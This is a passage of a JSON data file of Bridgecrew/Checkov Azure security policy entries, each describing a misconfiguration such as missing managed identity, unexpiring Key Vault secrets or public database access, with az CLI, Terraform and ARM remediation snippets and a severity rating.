        "url": "https://docs.bridgecrew.io/docs/bc_azr_iam_1",
        "description": "App Service is not registered with an Azure Active Directory account\nDescription\nManaged service identity in App Service increases security by eliminating secrets from the app, for example, credentials in the connection strings. App Service provides a highly-scalable, self-patching web hosting service in Azure. It also provides a managed identity for apps, which is a turn-key solution for securing access to an Azure SQL Database and other Azure services.\nWe recommend you register the App Service with your Azure Active Directory account ensuring the app will connect securely to other Azure services without the need of usernames and passwords.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to App Services.\nFor each App, click the App.\na) Navigate to the Setting section.\nb) Click Identity.\nc) Set Status to On.\n\nCLI Command\nTo set the Register with Azure Active Directory feature for an existing app, use the following command:\naz webapp identity assign \n--resource-group <RESOURCE_GROUP_NAME> \n--name <APP_NAME>\n\nFix - Buildtime\nTerraform\n\nResource: azurerm_app_service\nField: identity\n\nGoresource \"azurerm_app_service\" \"example\" {\n    ...\n+    identity {\n+        type = \"UserAssigned\"\n+        identity_ids = \"12345\"\n    }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_39": {
        "url": "https://docs.bridgecrew.io/docs/do-not-create-custom-subscription-owner-roles",
        "description": "Azure subscriptions with custom roles are overly permissive\nDescription\nSubscription ownership should not include permission to create custom owner roles. The principle of least privilege should be followed and only necessary privileges be assigned instead of allowing full administrative access. Classic subscription admin roles offer basic access management and include Account Administrator, Service Administrator, and Co-Administrators. \nWe recommend the minimum permissions necessary be given to subscription owner accounts initially. Permissions can be added as needed by the account holder. This ensures the account holder cannot perform actions which were not intended.\nFix - Runtime\nCLI Command\nTo provide a list of the role identified, use the following command:\naz role definition list\nCheck for entries with assignableScope of / or a subscription, and an action of *.\nTo verify the usage and impact of removing the role identified, use the following command:\naz role definition delete --name \"rolename\"\nFix - Buildtime \nTerraform\nOption 1\n\nResource: azurerm_role_definition\nArgument: actions\n\nGoresource \"azurerm_role_definition\" \"example\" {\n    name        = \"my-custom-role\"\n    scope       = data.azurerm_subscription.primary.id\n    description = \"This is a custom role created via Terraform\"\n\n    permissions {\n    actions     = [\n -    \"*\"\n +    <selected actions>\n     ]\n    not_actions = []\n    }\n\n    assignable_scopes = [\n    \"/\"\n    ]\n}\n\nOption 2\n\nResource: azurerm_role_definition\nArgument: assignable_scopes\n\nJSONresource \"azurerm_role_definition\" \"example\" {\n    name        = \"my-custom-role\"\n    scope       = data.azurerm_subscription.primary.id\n    description = \"This is a custom role created via Terraform\"\n    permissions {\n    actions     = [\n     \"*\"\n     ]\n    not_actions = []\n    }\n\n    assignable_scopes = [\n+    <narrower scopes than subscriptions>\n-    \"/\"\n-   data.azurerm_subscription.primary.id\n-   resource.azurerm_subscription.primary.id\n    ]\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AZURE_41": {
        "url": "https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-secrets",
        "description": "AKV secrets do not have an expiration date set \nDescription\nThe Azure Key Vault (AKV) enables users to store and keep secrets within the Microsoft Azure environment. Secrets in the AKV are octet sequences with a maximum size of 25k bytes each.\nThe exp (expiration time) attribute identifies the expiration time on or after which the secret must not be used. By default, secrets do not expire. \nWe recommend you rotate secrets in the key vault and set an explicit expiration time for all secrets. This ensures that the secrets cannot be used beyond their assigned lifetimes.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Key vaults.\nFor each Key vault:\na) Click Secrets.\nb) Navigate to Settings.\nc) Set Enabled? to Yes.\nd) Set an appropriate EXPIRATION DATE on all secrets.\n\nCLI Command\nTo set an EXPIRATION DATE on all secrets, use the following command:\naz keyvault secret set-attributes \n--name <secretName> \n--vault-name <vaultName> \n--expires Y-m-d'T'H:M:S'Z'\n\nFix - Buildtime\nTerraform \n\nResource: azurerm_key_vault_secret\nArgument: expiration_date\n\nGoresource \"azurerm_key_vault_secret\" \"example\" {\n     ...\n +   expiration_date = \"2020-12-30T20:00:00Z\"\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AZURE_45": {
        "url": "https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-secrets",
        "description": "AKV secrets do not have an expiration date set \nDescription\nThe Azure Key Vault (AKV) enables users to store and keep secrets within the Microsoft Azure environment. Secrets in the AKV are octet sequences with a maximum size of 25k bytes each.\nThe exp (expiration time) attribute identifies the expiration time on or after which the secret must not be used. By default, secrets do not expire. \nWe recommend you rotate secrets in the key vault and set an explicit expiration time for all secrets. This ensures that the secrets cannot be used beyond their assigned lifetimes.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to Key vaults.\nFor each Key vault:\na) Click Secrets.\nb) Navigate to Settings.\nc) Set Enabled? to Yes.\nd) Set an appropriate EXPIRATION DATE on all secrets.\n\nCLI Command\nTo set an EXPIRATION DATE on all secrets, use the following command:\naz keyvault secret set-attributes \n--name <secretName> \n--vault-name <vaultName> \n--expires Y-m-d'T'H:M:S'Z'\n\nFix - Buildtime\nTerraform \n\nResource: azurerm_key_vault_secret\nArgument: expiration_date\n\nGoresource \"azurerm_key_vault_secret\" \"example\" {\n     ...\n +   expiration_date = \"2020-12-30T20:00:00Z\"\n}\n",
        "severity": "CRITICAL"
    },
    "CKV_AZURE_4": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_kubernetes_1",
        "description": "Azure AKS cluster monitoring is not enabled\nDescription\nThe Azure Monitoring service collects and stores valuable telemetry reported by AKS. This includes: memory and processor metrics for controllers, nodes and containers logs, and logs from the individual containers. This data is accessible through Azure Log Analytics for the AKS cluster and Azure Monitor instance.\nWe recommend storing memory and processor metrics from containers, nodes, and controllers. This enables strong real-time and post-mortem analysis of unknown behaviors in AKS clusters.\nFix - Runtime \nCLI Command\nTo enable Azure Monitor for an existing AKS cluster, use the following command: \naz aks enable-addons \n-a monitoring -n rg-weu-my-cluster -g rg-weu-my-cluster-group\n--workspace-resource-id 4ab81b6f-c07d-d174-ef26-f4344bad14a\n\nUse the default Log Analytics workspace:\naz aks enable-addons \n-a monitoring -n rg-weu-my-cluster -g rg-weu-my-cluster-group\n\nThis will take a few moments. When complete, you can verify using the show command:\naz aks show -n rg-weu-my-cluster -g rg-weu-my-cluster-group\n\nThis provides general AKS information, including the following portion for: \nShelladdonProfiles\n\"addonProfiles\": {\n    \"omsagent\": {\n      \"config\": {\n        \"logAnalyticsWorkspaceResourceID\":\n        \"/subscriptions/GUID/resourcegroups/defaultresourcegroup-weu/providers\n        /microsoft.operationalinsights/workspaces/defaultworkspace-GUID-weu\"\n      },\n      \"enabled\": true\n    }\n  },\n\nFix - Buildtime\nTerraform\n\nResource: azurerm_kubernetes_cluster\nArgument: log_analytics_workspace_id\n\nGoresource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_kubernetes_cluster\" \"example\" {\n  name                = \"example-aks1\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  dns_prefix          = \"exampleaks1\"\n\n  default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n  }\n\n  addon_profile {\n    oms_agent {\n      enabled                    = true\n      log_analytics_workspace_id = \"workspaceResourceId\"\n    }\n  }\n\n  tags = {\n    Environment = \"Production\"\n  }\n}\n\noutput \"client_certificate\" {\n  value = azurerm_kubernetes_cluster.example.kube_config.0.client_certificate\n}\n\noutput \"kube_config\" {\n  value = azurerm_kubernetes_cluster.example.kube_config_raw\n}\n\nARM Template\n\nResource: Microsoft.ContainerService/managedClusters\nArgument: logAnalyticsWorkspaceResourceID\n\nGo{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"parameters\": {\n    \"aksResourceId\": {\n      \"type\": \"string\",\n      \"metadata\": {\n        \"description\": \"AKS Cluster Resource ID\"\n      }\n    },\n    \"aksResourceLocation\": {\n      \"type\": \"string\",\n      \"metadata\": {\n        \"description\": \"Location of the AKS resource e.g. \\\"East US\\\"\"\n      }\n    },\n    \"aksResourceTagValues\": {\n      \"type\": \"object\",\n      \"metadata\": {\n        \"description\": \"Existing all tags on AKS Cluster Resource\"\n      }\n    },\n    \"workspaceResourceId\": {\n      \"type\": \"string\",\n      \"metadata\": {\n        \"description\": \"Azure Monitor Log Analytics Resource ID\"\n      }\n    }\n  },\n  \"resources\": [\n    {\n      \"name\": \"[split(parameters('aksResourceId'),'/')[8]]\",\n      \"type\": \"Microsoft.ContainerService/managedClusters\",\n      \"location\": \"[parameters('aksResourceLocation')]\",\n      \"tags\": \"[parameters('aksResourceTagValues')]\",\n      \"apiVersion\": \"2018-03-31\",\n      \"properties\": {\n        \"mode\": \"Incremental\",\n        \"id\": \"[parameters('aksResourceId')]\",\n        \"addonProfiles\": {\n          \"omsagent\": {\n            \"enabled\": true,\n            \"config\": {\n+             \"logAnalyticsWorkspaceResourceID\": \"[parameters('workspaceResourceId')]\"\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_5": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_kubernetes_2",
        "description": "Azure AKS enable RBAC not enforced\nDescription\nAzure Kubernetes Service (AKS) can be configured to use Azure Active Directory (AD) and Kubernetes Role-based Access Control (RBAC). RBAC is designed to work on resources within your AKS clusters. With RBAC, you can create a role definition that outlines the permissions to be applied. A user or group is then assigned this role definition for a particular scope, which could be an individual resource, a resource group, or across the subscription.\nWe recommend you sign in to an AKS cluster using an Azure AD authentication token and configure Kubernetes RBAC. This will limit access to cluster resources based a user's identity or group membership.\nFix - Buildtime \nTerraform\nResource: azurerm_kubernetes_cluster\nArgument: role_based_access_control_enabled\nazurerm_kubernetes_cluster.pike.tfresource \"azurerm_kubernetes_cluster\" \"pike\" {\n...\n+ role_based_access_control_enabled = true\n...\n}\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_6": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_kubernetes_3",
        "description": "AKS API server does not define authorized IP ranges \nDescription\nThe AKS API server receives requests to perform actions in the cluster , for example, to create resources, and scale the number of nodes. The API server provides a secure way to manage a cluster. \nTo enhance cluster security and minimize attacks, the API server should only be accessible from a limited set of IP address ranges. These IP ranges allow defined IP address ranges to communicate with the API server. A request made to the API server from an IP address that is not part of these authorized IP ranges is blocked.\nFix - Runtime \nCLI Command\nWhen you specify a CIDR range, start with the first IP address in the range. \nShellaz aks create \\\n    --resource-group myResourceGroup \\\n    --name myAKSCluster \\\n    --node-count 1 \\\n    --vm-set-type VirtualMachineScaleSets \\\n    --load-balancer-sku standard \\\n    --api-server-authorized-ip-ranges 73.140.245.0/24 \\\n    --generate-ssh-keys\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_kubernetes_cluster\nArgument: api_server_authorized_ip_ranges (Optional)\nThe IP ranges to whitelist for incoming traffic to the masters.\n\nGoresource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_kubernetes_cluster\" \"example\" {\n  ...\n+   api_server_authorized_ip_ranges = '192.168.0.0/16'\n  ...\n}\n\noutput \"client_certificate\" {\n  value = azurerm_kubernetes_cluster.example.kube_config.0.client_certificate\n}\n\noutput \"kube_config\" {\n  value = azurerm_kubernetes_cluster.example.kube_config_raw\n}\n\nARM Templates\n\nResource: Microsoft.ContainerService/managedClusters\nArgument: apiServerAuthorizedIPRanges\n\nGo{\n  \"name\": \"string\",\n  \"type\": \"Microsoft.ContainerService/managedClusters\",\n  \"apiVersion\": \"2019-06-01\",\n  \"location\": \"string\",\n  \"tags\": {},\n  \"properties\": {\n    \"kubernetesVersion\": \"string\",\n    \"dnsPrefix\": \"string\",\n    \"agentPoolProfiles\": [\n      {\n        \"count\": \"integer\",\n        \"vmSize\": \"string\",\n        \"osDiskSizeGB\": \"integer\",\n        \"vnetSubnetID\": \"string\",\n        \"maxPods\": \"integer\",\n        \"osType\": \"string\",\n        \"maxCount\": \"integer\",\n        \"minCount\": \"integer\",\n        \"enableAutoScaling\": \"boolean\",\n        \"type\": \"string\",\n        \"orchestratorVersion\": \"string\",\n        \"availabilityZones\": [\n          \"string\"\n        ],\n        \"enableNodePublicIP\": \"boolean\",\n        \"scaleSetPriority\": \"string\",\n        \"scaleSetEvictionPolicy\": \"string\",\n        \"nodeTaints\": [\n          \"string\"\n        ],\n        \"name\": \"string\"\n      }\n    ],\n    \"linuxProfile\": {\n      \"adminUsername\": \"string\",\n      \"ssh\": {\n        \"publicKeys\": [\n          {\n            \"keyData\": \"string\"\n          }\n        ]\n      }\n    },\n    \"windowsProfile\": {\n      \"adminUsername\": \"string\",\n      \"adminPassword\": \"string\"\n    },\n    \"servicePrincipalProfile\": {\n      \"clientId\": \"string\",\n      \"secret\": \"string\"\n    },\n    \"addonProfiles\": {},\n    \"nodeResourceGroup\": \"string\",\n    \"enableRBAC\": \"boolean\",\n    \"enablePodSecurityPolicy\": \"boolean\",\n    \"networkProfile\": {\n      \"networkPlugin\": \"string\",\n      \"networkPolicy\": \"string\",\n      \"podCidr\": \"string\",\n      \"serviceCidr\": \"string\",\n      \"dnsServiceIP\": \"string\",\n      \"dockerBridgeCidr\": \"string\",\n      \"loadBalancerSku\": \"string\"\n    },\n    \"aadProfile\": {\n      \"clientAppID\": \"string\",\n      \"serverAppID\": \"string\",\n      \"serverAppSecret\": \"string\",\n      \"tenantID\": \"string\"\n    },\n +  \"apiServerAuthorizedIPRanges\": [\n      \"string\"\n    ]\n  },\n  \"identity\": {\n    \"type\": \"string\"\n  },\n  \"resources\": []\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_7": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_kubernetes_4",
        "description": "AKS cluster network policies are not enforced\nDescription\nNetwork policy options in AKS include two ways to implement a network policy. You can choose between Azure Network Policies or Calico Network Policies. In both cases, the underlying controlling layer is based on Linux IPTables to enforce the specified policies. Policies are translated into sets of allowed and disallowed IP pairs. These pairs are then programmed as IPTable rules.\nThe principle of least privilege should be applied to how traffic can flow between pods in an AKS cluster. We recommend you select a preferred network policy framework and enforce granular usage-based policies on the architecture and business logic of you applications.\nFix - Buildtime\nTerraform\nResource: azurerm_kubernetes_cluster\nArgument: network_plugin\nazurerm_kubernetes_cluster.pike.tfresource \"azurerm_kubernetes_cluster\" \"pike\" {\n...\n  network_profile {\n    network_plugin=\"azure\"\n  }\n...\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_8": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_kubernetes_5",
        "description": "Kubernetes dashboard is not disabled\nDescription\nThe Terraform provider for Azure provides the capability to disable the Kubernetes dashboard on an AKS cluster. This is achieved by providing the Kubernetes dashboard as an AKS add-on like the Azure Monitor for containers integration, AKS virtual nodes, or HTTP application routing. The dashboard add-on is disabled by default for all new clusters created on Kubernetes 1.18 or greater.\nIn mid-2019 Tesla was hacked and their Kubernetes dashboard was open to the internet. Hackers browsed around and found credentials, eventually managing to deploy pods running bitcoin mining software. \nWe recommend you disable the Kubernetes dashboard to prevent the need to manage its individual access interface, eliminating it as an attack vector.\nFix - Runtime\nCLI Command\naz aks disable-addons -g myRG -n myAKScluster -a kube-dashboard \n\nFix - Buildtime \nTerraform\n\nResource: azurerm_kubernetes_cluster\nArgument: kube_dashboard (required): Is the Kubernetes Dashboard enabled?\n\nGo...\n  addon_profile {\n    kube_dashboard {\n      enabled = false\n    }\n  }\n...\n\nARM Templates\n\nResource: Microsoft.ContainerService/managedClusters\nArgument: kubeDashboard\n\nGo...\n        \"addonProfiles\": {\n          \"kubeDashboard\": {\n            \"enabled\": false\n          }\n        },\n...\n",
        "severity": "LOW"
    },
    "CKV_AZURE_44": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_storage_2",
        "description": "Storage account does not use the latest version of TLS encryption\nDescription\nCommunication between a client application and an Azure Storage account is encrypted using Transport Layer Security (TLS). TLS is a standard cryptographic protocol that ensures privacy and data integrity between clients and services over the Internet.\nAzure Storage currently supports three versions of the TLS protocol: 1.0, 1.1, and 1.2. Azure Storage uses TLS 1.2 on public HTTPS endpoints, but TLS 1.0 and TLS 1.1 are still supported for backward compatibility.\nTo follow security best practices and the latest PCI compliance standards, Microsoft recommends enabling the latest version of TLS protocol (TLS 1.2) for all your Microsoft Azure App Service web applications. PCI DSS information security standard requires that all websites accepting credit card payments uses TLS 1.2 after June 30, 2018.\nFix - Runtime \nAzure Portal\nTo change the policy using the Azure Portal, follow these steps:\n\nLog in to the Azure Portal at https://portal.azure.com.\nNavigate to your storage account.\nSelect Configuration.\nUnder Minimum TLS version, use the drop-down to select the minimum version of TLS required to access data in this storage account, as shown in the following image.\n\nCLI Command\nThe minimumTlsVersion property is not set by default when you create a storage account with Azure CLI. This property does not return a value until you explicitly set it. The storage account permits requests sent with TLS version 1.0 or greater if the property value is null.\nShellaz storage account create \\\n    --name <storage-account> \\\n    --resource-group <resource-group> \\\n    --kind StorageV2 \\\n    --location <location> \\\n    --min-tls-version TLS1_1\n\naz storage account show \\\n    --name <storage-account> \\\n    --resource-group <resource-group> \\\n    --query minimumTlsVersion \\\n    --output tsv\n\naz storage account update \\\n    --name <storage-account> \\\n    --resource-group <resource-group> \\\n    --min-tls-version TLS1_2\n\naz storage account show \\\n    --name <storage-account> \\\n    --resource-group <resource-group> \\\n    --query minimumTlsVersion \\\n    --output tsv\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_storage_account\nAttribute: min_tls_version (Optional)\nThe minimum supported TLS version for the storage account. Possible values are TLS1_0, TLS1_1, and TLS1_2. Defaults to TLS1_0 for new storage accounts. Use TLS1_2.\n\nGoresource \"azurerm_storage_account\" \"test\" {\n  ...\n+  min_tls_version      = \"TLS1_2\"\n  ...\n}\n\nARM Template\n\nResource: Microsoft.Storage/storageAccounts\nArgument: minimumTlsVersion\nTo configure the minimum TLS version for a storage account with a template, create a template with the MinimumTLSVersion property set to TLS1_0, TLS1_1, or TLS1_2. \n\nGo{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"parameters\": {},\n    \"variables\": {\n        \"storageAccountName\": \"[concat(uniqueString(subscription().subscriptionId), 'tls')]\"\n    },\n    \"resources\": [\n        {\n        \"name\": \"[variables('storageAccountName')]\",\n        \"type\": \"Microsoft.Storage/storageAccounts\",\n        \"apiVersion\": \"2019-06-01\",\n        \"location\": \"<location>\",\n        \"properties\": {\n            \"minimumTlsVersion\": \"TLS1_2\"\n        },\n        \"dependsOn\": [],\n        \"sku\": {\n          \"name\": \"Standard_GRS\"\n        },\n        \"kind\": \"StorageV2\",\n        \"tags\": {}\n        }\n    ]\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_47": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_networking_17",
        "description": "Azure MariaDB database server with SSL connection disabled\nDescription\nAzure Database for MariaDB supports connecting your Azure Database for MariaDB server to client applications using Secure Sockets Layer (SSL). Enforcing SSL connections between your database server and your client applications helps protect against 'man in the middle' attacks by encrypting the data stream between the server and your application. This configuration enforces that SSL is always enabled for accessing your database server.\nFix - Buildtime \nTerraform\n\nResources: azurerm_mariadb_server \nArgument: ssl_enforcement_enabled\n\nGoresource \"azurerm_mariadb_server\" \"example\" {\n  ...\n+  ssl_enforcement_enabled = true\n}\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_48": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_public_1",
        "description": "MariaDB servers do not have public network access enabled set to False\nDescription\nIt is generally a good security practice to ensure that your MariaDB servers do not have public network access enabled, as this means that they are only accessible from within your private network. This can help to protect your database servers from unauthorized access, as external parties will not be able to connect to them over the internet. It is especially important to ensure that public network access is disabled if your MariaDB servers contain sensitive or confidential data.\nFix - Buildtime \nTerraform\n\nResources: azurerm_mariadb_server \nArgument: public_network_access_enabled is set to False.\n\nGoresource \"azurerm_mariadb_server\" \"example\" {\n   ...\n+  public_network_access_enabled = false\n\n}\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_49": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_13",
        "description": "Azure Linux scale set does not use an SSH key\nDescription\nThe default option for a Linux scale set uses basic authentication as an access credential for the secure shell network protocol.\nUsing SSH keys instead of common credentials (i.e. username and password) represents the best way to secure your Linux scale sets against malicious activities such as brute-force attacks, by providing a level of authorization that can only be fulfilled by privileged users who have ownership to the private key associated with the public key created on these sets. An attacker may be able to get access to the linux scale set\u2019s public key, but without the associated private key, he/she will be unable to gain shell access to the server.\nFix - Buildtime\nTerraform\nResource: azurerm_linux_virtual_machine_scale_set\nAttribute: disable_password_authentication\nazurerm_linux_virtual_machine_scale_set.example.tfresource \"azurerm_linux_virtual_machine_scale_set\" \"example\" {\n            ...\n          ~ disable_password_authentication = true\n        }\n",
        "severity": "HIGH"
    },
    "CKV_AZURE_50": {
        "url": "https://docs.bridgecrew.io/docs/bc_azr_general_14",
        "description": "Virtual Machine extensions are installed\nDescription\nEnsure that your Microsoft Azure virtual machines (VMs) does not have extensions installed in order to follow your organization's security and compliance requirements. Azure virtual machine extensions are small cloud applications that provide post-deployment configuration and automation tasks for virtual machines. These extensions run with administrative privileges and could potentially access any configuration file or piece of data on a virtual machine. \nFix - Buildtime\nTerraform\n\nResource: azurerm_virtual_machine, azurerm_linux_virtual_machine\nArgument: allow_extension_operations\n\nazurerm_linux_virtual_machine.example.tfresource \"azurerm_linux_virtual_machine\" \"example\" {\n    ...\n ~  allow_extension_operations=false\n  }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_60": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-storage-account-enables-secure-transfer",
        "description": "Storage accounts without secure transfer enabled\nDescription\nThe secure transfer option enhances the security of a storage account by only allowing requests to the storage account by a secure connection. For example, when calling REST APIs to access storage accounts, the connection must use HTTPS. Any requests using HTTP will be rejected when 'secure transfer required' is enabled. When using the Azure files service, connection without encryption will fail, including scenarios using SMB 2.1, SMB 3.0 without encryption, and some flavors of the Linux SMB client. Because Azure storage doesn\u2019t support HTTPS for custom domain names, this option is not applied when using a custom domain name.\nFix - Buildtime \nTerraform\n\nResource: azurerm_storage_account\nArgument:  enable_https_traffic_only\n\nGoresource \"azurerm_storage_account\" \"example\" {\n              ...\n           +  enable_https_traffic_only = true\n            }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_63": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-app-service-enables-http-logging",
        "description": "App service does not enable HTTP logging\nDescription\nBy enabling HTTP logging for your app service, you can collect this information and use it to monitor and troubleshoot your app, as well as identify any potential security issues or threats. This can help to ensure that your app is running smoothly and is secure from potential attacks.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: logs.http_logs \n\nGoresource \"azurerm_app_service\" \"example\" {\n              name                = \"example-app-service\"\n              location            = azurerm_resource_group.example.location\n              resource_group_name = azurerm_resource_group.example.name\n              app_service_plan_id = azurerm_app_service_plan.example.id\n            \n+             logs {\n+               http_logs {\n                    retention_in_days = 4\n                    retention_in_mb = 10\n                }\n              }\n            \n              app_settings = {\n                \"SOME_KEY\" = \"some-value\"\n              }\n            \n              connection_string {\n                name  = \"Database\"\n                type  = \"SQLServer\"\n                value = \"Server=some-server.mydomain.com;Integrated Security=SSPI\"\n              }\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_68": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-disables-public-network-access",
        "description": "PostgreSQL server does not disable public network access\nDescription\nDisabling the public network access property improves security by ensuring your Azure Database for PostgreSQL single servers can only be accessed from a private endpoint. This configuration strictly disables access from any public address space outside of Azure IP range and denies all logins that match IP or virtual network-based firewall rules.\nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_server\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_postgresql_server\" \"example\" {\n              ...\n+             public_network_access_enabled    = false\n              ...\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_69": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-azure-sql-database-servers",
        "description": "Azure Security Center Defender is set to Off for Azure SQL database servers\nDescription\nAzure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). \nAzure Defender for SQL servers on machines extends the protections for your Azure-native SQL Servers to fully support hybrid environments and protect SQL servers (all supported version) hosted in Azure\nFix - Buildtime \nTerraform\n\nResource: azurerm_security_center_subscription_pricing\nArgument: resource_type - (Required) The resource type this setting affects. Ensure that SqlServers and SqlServerVirtualMachines are declared to pass this check.\n\nGoresource \"azurerm_security_center_subscription_pricing\" \"example\" {\n  tier          = \"Standard\"\n  resource_type = \"AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_70": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-function-apps-is-only-accessible-over-https",
        "description": "Function apps are not only accessible over HTTPS\nDescription\nBy ensuring that function apps are only accessible over HTTPS, you can help to protect the data transmitted to and from your app from being accessed or modified by unauthorized parties. This can help to improve the security of your app and protect it from potential threats such as man-in-the-middle attacks or data breaches.\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument:https_only \n\nGoresource \"azurerm_app_service\" \"example\" {\n                            ...\n +            https_only          = true\n            }\n",
        "severity": "MEDIUM"
    },
    "CKV_AZURE_71": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-managed-identity-provider-is-enabled-for-app-services",
        "description": "Azure App Service Web app does not have a Managed Service Identity\nDescription\nManaged service identity in App Service makes the app more secure by eliminating secrets from the app, such as credentials in the connection strings. When registering with Azure Active Directory in the app service, the app will connect to other Azure services securely without the need of username and passwords.\nFix - Runtime \nIn Azure Console\n\nLog in to the Azure portal.\nNavigate to App Services.\nClick on the reported App.\nUnder Setting section, Click on 'Identity'.\nEnsure that 'Status' is set to 'On'.\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: identity.type\n\nGoresource \"azurerm_app_service\" \"example\" {\n              ...\n  +           identity {\n  +             type = \"SystemAssigned\"\n                }\n              }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_73": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-automation-account-variables-are-encrypted",
        "description": "Azure Automation account variables are not encrypted\nDescription\nIf you have Automation Account Variables storing sensitive data that are not already encrypted, then you will need to delete them and recreate them as encrypted variables. \nFix - Runtime \nIn Azure CLI\nTextSet-AzAutomationVariable -AutomationAccountName '{AutomationAccountName}' -Encrypted $true -Name '{VariableName}' -ResourceGroupName '{ResourceGroupName}' -Value '{Value}'\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_automation_variable_int\nArgument: encrypted\n\nGoresource \"azurerm_automation_variable_int\" \"example\" {\n  ...\n+ encrypted               = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_74": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-uses-disk-encryption",
        "description": "Azure Data Explorer does not use disk encryption\nDescription\nEnabling encryption at rest using a customer-managed key on your Azure Data Explorer cluster provides additional control over the key being used by the encryption at rest. This feature is oftentimes applicable to customers with special compliance requirements and requires a Key Vault to managing the keys.\nFix - Buildtime \nTerraform\n\nResource: azurerm_kusto_cluster\nArgument: enable_disk_encryption\n\nGoresource \"azurerm_kusto_cluster\" \"example\" {\n    ...\n  + enable_disk_encryption = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_75": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-uses-double-encryption",
        "description": "Azure Data Explorer does not use double encryption\nDescription\nEnabling double encryption helps protect and safeguard your data to meet your organizational security and compliance commitments. When double encryption has been enabled, data in the storage account is encrypted twice, once at the service level and once at the infrastructure level, using two different encryption algorithms and two different keys.\nFix - Buildtime \nTerraform\n\nResource: azurerm_kusto_cluster\nArgument: double_encryption_enabled\n\nGoresource \"azurerm_kusto_cluster\" \"example\" {\n  ...\n+ double_encryption_enabled = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_76": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-batch-account-uses-key-vault-to-encrypt-data",
        "description": "Azure Batch account does not use key vault to encrypt data\nDescription\nUse customer-managed keys to manage the encryption at rest of your Batch account's data. By default, customer data is encrypted with service-managed keys, but customer-managed keys are commonly required to meet regulatory compliance standards. Customer-managed keys enable the data to be encrypted with an Azure Key Vault key created and owned by you. You have full control and responsibility for the key lifecycle, including rotation and management.\nFix - Buildtime \nTerraform\n\nResource: azurerm_batch_account\nArgument: key_vault_reference\n\nGoresource \"azurerm_batch_account\" \"example\" {\n                            ...\n+             key_vault_reference {\n                id = \"test\"\n                url = \"https://test.com\"\n              }\n            }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_77": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-udp-services-are-restricted-from-the-internet",
